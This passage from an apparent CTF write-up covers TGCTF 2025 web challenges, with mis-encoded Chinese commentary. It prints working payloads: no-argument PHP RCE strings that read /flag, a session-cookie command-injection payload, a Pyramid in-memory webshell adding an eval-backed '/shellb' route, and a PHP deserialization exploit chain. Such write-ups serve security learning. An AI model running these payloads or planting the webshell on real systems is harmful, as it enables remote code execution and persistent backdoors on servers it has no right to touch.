</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="k">if</span> <span class="o">(</span>preg_match<span class="o">(</span><span class="s1">&#39;/.+?&lt;/s&#39;</span>, <span class="nv">$file_content</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;æ–‡ä»¶å†…å®¹åŒ…å«éæ³•å­—ç¬¦ï¼Œç¦æ­¢ä¸Šä¼ ï¼&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">                <span class="nv">$status_code</span> <span class="o">=</span> 403<span class="p">;</span> // <span class="m">403</span> è¡¨ç¤ºç¦æ­¢è®¿é—®
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">                <span class="nv">$img_path</span> <span class="o">=</span> UPLOAD_PATH . <span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                <span class="k">if</span> <span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$temp_file</span>, <span class="nv">$img_path</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                    <span class="nv">$is_upload</span> <span class="o">=</span> true<span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">                    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">                    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;ä¸Šä¼ å‡ºé”™ï¼&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">                    <span class="nv">$status_code</span> <span class="o">=</span> 500<span class="p">;</span> // <span class="m">500</span> è¡¨ç¤ºæœåŠ¡å™¨å†…éƒ¨é”™è¯¯
</span></span><span class="line"><span class="ln">32</span><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="nv">$status_code</span> <span class="o">=</span> 403<span class="p">;</span> // <span class="m">403</span> è¡¨ç¤ºç¦æ­¢è®¿é—®
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> UPLOAD_PATH . <span class="s1">&#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="nv">$status_code</span> <span class="o">=</span> 404<span class="p">;</span> // <span class="m">404</span> è¡¨ç¤ºèµ„æºæœªæ‰¾åˆ°
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">
</span></span><span class="line"><span class="ln">44</span><span class="cl">// è®¾ç½® HTTP çŠ¶æ€ç 
</span></span><span class="line"><span class="ln">45</span><span class="cl">http_response_code<span class="o">(</span><span class="nv">$status_code</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">
</span></span><span class="line"><span class="ln">47</span><span class="cl">// è¾“å‡ºç»“æœ
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="nb">echo</span> json_encode<span class="o">([</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="s1">&#39;status_code&#39;</span> <span class="o">=</span>&gt; <span class="nv">$status_code</span>,
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="s1">&#39;msg&#39;</span> <span class="o">=</span>&gt; <span class="nv">$msg</span>,
</span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="o">])</span><span class="p">;</span>
</span></span></code></pre></div><p>å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œçœ‹åˆ°æœ‰ä¸ªnameï¼Œå¯ä»¥å¯¹æ–‡ä»¶åè¿›è¡Œä¿®æ”¹ï¼Œæƒ³åˆ°ç›®å½•ç©¿è¶Š</p>
<p>åˆ©ç”¨è¿™ä¸ªè¿›è¡Œç›®å½•ç©¿è¶Šï¼ŒæŠŠ.user.iniä¼ åˆ°webç›®å½•ï¼Œç„¶åæ–‡ä»¶åŒ…å«1.jpg</p>
<p><img alt="img" loading="lazy" src="../assets/1744970124106-18.png"></p>
<p><img alt="img" loading="lazy" src="../assets/1744970124054-1.png"></p>
<p>è¿èšå‰‘æ‹¿flag</p>
<h3 id="aaaå·æ¸¡é˜´å¹³"><strong>AAAå·æ¸¡é˜´å¹³</strong><a hidden class="anchor" aria-hidden="true" href="#aaaå·æ¸¡é˜´å¹³">#</a></h3>
<p>æ— å‚RCE</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">?tgctf2025<span class="o">=</span>system<span class="o">(</span>end<span class="o">(</span>current<span class="o">(</span>get_defined_vars<span class="o">())))</span><span class="p">;&amp;</span><span class="nv">b</span><span class="o">=</span>tac /flag
</span></span></code></pre></div><p><img alt="img" loading="lazy" src="../assets/1744970124054-2.png"></p>
<h3 id="aaaå·æ¸¡é˜´å¹³å¤ä»‡"><strong>AAAå·æ¸¡é˜´å¹³ï¼ˆå¤ä»‡ï¼‰</strong><a hidden class="anchor" aria-hidden="true" href="#aaaå·æ¸¡é˜´å¹³å¤ä»‡">#</a></h3>
<p>åˆ©ç”¨session_idæ‰“æ— å‚RCE</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">/?tgctf2025<span class="o">=</span>session_start<span class="o">()</span><span class="p">;</span>system<span class="o">(</span>hex2bin<span class="o">(</span>session_id<span class="o">()))</span><span class="p">;</span>
</span></span></code></pre></div><p>å°†cookieæ”¹ä¸º</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">PHPSESSID</span><span class="o">=</span>636174202f662a
</span></span></code></pre></div><h3 id="ç†Ÿæ‚‰çš„é…æ–¹ç†Ÿæ‚‰çš„å‘³é“"><strong>ç†Ÿæ‚‰çš„é…æ–¹ï¼Œç†Ÿæ‚‰çš„å‘³é“</strong><a hidden class="anchor" aria-hidden="true" href="#ç†Ÿæ‚‰çš„é…æ–¹ç†Ÿæ‚‰çš„å‘³é“">#</a></h3>
<p>é¢˜ç›®</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.config</span> <span class="kn">import</span> <span class="n">Configurator</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.request</span> <span class="kn">import</span> <span class="n">Request</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.response</span> <span class="kn">import</span> <span class="n">Response</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.view</span> <span class="kn">import</span> <span class="n">view_config</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">from</span> <span class="nn">wsgiref.simple_server</span> <span class="kn">import</span> <span class="n">make_server</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.events</span> <span class="kn">import</span> <span class="n">NewResponse</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Environment</span><span class="p">,</span> <span class="n">BaseLoader</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">eval_globals</span> <span class="o">=</span> <span class="p">{</span> <span class="c1">#é˜²æ­¢evalæ‰§è¡Œæ¶æ„ä»£ç </span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="s1">&#39;__builtins__&#39;</span><span class="p">:</span> <span class="p">{},</span>      <span class="c1"># ç¦ç”¨æ‰€æœ‰å†…ç½®å‡½æ•°</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="s1">&#39;__import__&#39;</span><span class="p">:</span> <span class="kc">None</span>       <span class="c1"># ç¦æ­¢åŠ¨æ€å¯¼å…¥</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">def</span> <span class="nf">checkExpr</span><span class="p">(</span><span class="n">expr_input</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">expr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;[-+*/]&#34;</span><span class="p">,</span> <span class="n">expr_input</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">exec</span><span class="p">(</span><span class="n">expr_input</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">expr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nb">int</span><span class="p">(</span><span class="n">expr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nb">int</span><span class="p">(</span><span class="n">expr</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">return</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="k">def</span> <span class="nf">home_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="n">expr_input</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="n">expr_input</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="p">[</span><span class="s1">&#39;expr&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="k">if</span> <span class="n">checkExpr</span><span class="p">(</span><span class="n">expr_input</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expr_input</span><span class="p">,</span> <span class="n">eval_globals</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">e</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;çˆ¬ï¼&#34;</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">
</span></span><span class="line"><span class="ln">45</span><span class="cl">
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="n">template_str</span> <span class="o">=</span> <span class="err">ã€</span><span class="n">xxx</span><span class="err">ã€‘</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">
</span></span><span class="line"><span class="ln">48</span><span class="cl">    <span class="n">env</span> <span class="o">=</span> <span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">BaseLoader</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="n">env</span><span class="o">.</span><span class="n">from_string</span><span class="p">(</span><span class="n">template_str</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="n">rendered</span> <span class="o">=</span> <span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="n">expr_input</span><span class="o">=</span><span class="n">expr_input</span><span class="p">,</span> <span class="n">result</span><span class="o">=</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">rendered</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">
</span></span><span class="line"><span class="ln">53</span><span class="cl">
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">    <span class="k">with</span> <span class="n">Configurator</span><span class="p">()</span> <span class="k">as</span> <span class="n">config</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;home_view&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">home_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;home_view&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">58</span><span class="cl">        <span class="n">app</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">make_wsgi_app</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">
</span></span><span class="line"><span class="ln">60</span><span class="cl">    <span class="n">server</span> <span class="o">=</span> <span class="n">make_server</span><span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">9040</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">61</span><span class="cl">    <span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</span></span></code></pre></div><p>å®¡è®¡ä¸€ä¸‹å‘ç°åœ¨checkExprå¤„ä¼šå°†ä¼ å…¥çš„å†…å®¹ç”¨execè¿›è¡Œæ‰§è¡Œ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">def</span> <span class="nf">checkExpr</span><span class="p">(</span><span class="n">expr_input</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="n">expr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;[-+*/]&#34;</span><span class="p">,</span> <span class="n">expr_input</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">exec</span><span class="p">(</span><span class="n">expr_input</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">expr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="nb">int</span><span class="p">(</span><span class="n">expr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="nb">int</span><span class="p">(</span><span class="n">expr</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="mi">1</span>
</span></span></code></pre></div><p>æµ‹ä¸€ä¸‹å‘ç°é¢˜ç›®ä¸å‡ºç½‘ï¼Œæ‰“pyramidå†…å­˜é©¬</p>
<p>å‚è€ƒ</p>
<p><a href="https://forum.butian.net/share/3974">https://forum.butian.net/share/3974</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">def</span> <span class="nf">waff</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="k">def</span> <span class="nf">f</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">        <span class="k">yield</span> <span class="n">g</span><span class="o">.</span><span class="n">gi_frame</span><span class="o">.</span><span class="n">f_back</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="n">g</span> <span class="o">=</span> <span class="n">f</span><span class="p">()</span>             
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="n">frame</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">g</span><span class="p">)</span>     
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_back</span><span class="o">.</span><span class="n">f_back</span><span class="o">.</span><span class="n">f_globals</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">def</span> <span class="nf">hello</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="n">res</span><span class="o">=</span><span class="nb">eval</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;shellb&#39;</span><span class="p">,</span> <span class="s1">&#39;/shellb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">hello</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;shellb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="n">config</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="n">waff</span><span class="p">()</span>
</span></span></code></pre></div><p>åœ¨/shellbå¤„å‘½ä»¤æ‰§è¡Œæ‹¿flagå³å¯</p>
<h3 id="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ "><strong>ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ</strong><a hidden class="anchor" aria-hidden="true" href="#ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ">#</a></h3>
<p>robots.txté‡Œé¢çœ‹åˆ°ä¸€ä¸ªclass.php</p>
<p><img alt="img" loading="lazy" src="../assets/1744970124055-3.png"></p>
<p>/class.php</p>
<p>phpååºåˆ—åŒ–</p>
<p>exp</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">&lt;?php
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">class yesterday <span class="o">{</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    public <span class="nv">$learn</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    public <span class="nv">$study</span><span class="o">=</span><span class="s2">&#34;study&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    public <span class="nv">$try</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">class today <span class="o">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    public <span class="nv">$doing</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    public <span class="nv">$did</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    public <span class="nv">$done</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">class future<span class="o">{</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    private <span class="nv">$impossible</span><span class="o">=</span><span class="s2">&#34;How can you get here?&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    private <span class="nv">$out</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    private <span class="nv">$no</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$a</span> <span class="o">=</span> new yesterday<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$a</span> -&gt; <span class="nv">study</span> <span class="o">=</span> new today<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$a</span> -&gt; study -&gt; <span class="nv">doing</span> <span class="o">=</span> new future<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="nb">echo</span> base64_encode<span class="o">(</span>base64_encode<span class="o">(</span>base64_encode<span class="o">(</span>base64_encode<span class="o">(</span>base64_encode<span class="o">(</span>serialize<span class="o">(</span><span class="nv">$a</span><span class="o">))))))</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">?&gt;
</span></span></code></pre></div><p>ä¼ å…¥æ—¶ä¼šæˆªæ–­å4ä½ï¼Œéšä¾¿åœ¨åé¢åŠ å‡ ä¸ªå­—ç¬¦ä¸²å°±å¥½</p>
<p>æ¥ä¸‹æ¥wowä¼ å‚RCEæ‹¿flagå°±è¡Œ</p>
<h3 id="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ å¤ä»‡"><strong>ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿï¼ˆå¤ä»‡ï¼‰</strong><a hidden class="anchor" aria-hidden="true" href="#ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ å¤ä»‡">#</a></h3>
<p>ä¸Šä¸€é¢˜å¯ä»¥æ‹¿åˆ°upload.phpçš„æºç </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">&lt;?php
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="nv">$uploadDir</span> <span class="o">=</span> <span class="s1">&#39;uploads/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">if</span><span class="o">(</span>!file_exists<span class="o">(</span><span class="nv">$uploadDir</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        mkdir<span class="o">(</span><span class="nv">$uploadDir</span>, 0777, <span class="nb">true</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    // ç™½åå•å…è®¸çš„æ‰©å±•å
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nv">$allowedExtensions</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;atg&#39;</span><span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$fileName</span> <span class="o">=</span> basename<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;name&#39;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nv">$fileExtension</span> <span class="o">=</span> strtolower<span class="o">(</span>pathinfo<span class="o">(</span><span class="nv">$fileName</span>, PATHINFO_EXTENSION<span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    // æ£€æŸ¥æ–‡ä»¶æ‰©å±•å
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">if</span><span class="o">(</span>!in_array<span class="o">(</span><span class="nv">$fileExtension</span>, <span class="nv">$allowedExtensions</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        die<span class="o">(</span><span class="s2">&#34;hackerï¼&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$uploadFile</span> <span class="o">=</span> <span class="nv">$uploadDir</span> . <span class="nv">$fileName</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="o">]</span>, <span class="nv">$uploadFile</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;æ–‡ä»¶å·²ä¿å­˜åˆ°ï¼š</span><span class="nv">$uploadFile</span><span class="s2"> ï¼&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;æ–‡ä»¶ä¿å­˜å‡ºé”™ï¼&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="o">}</span>
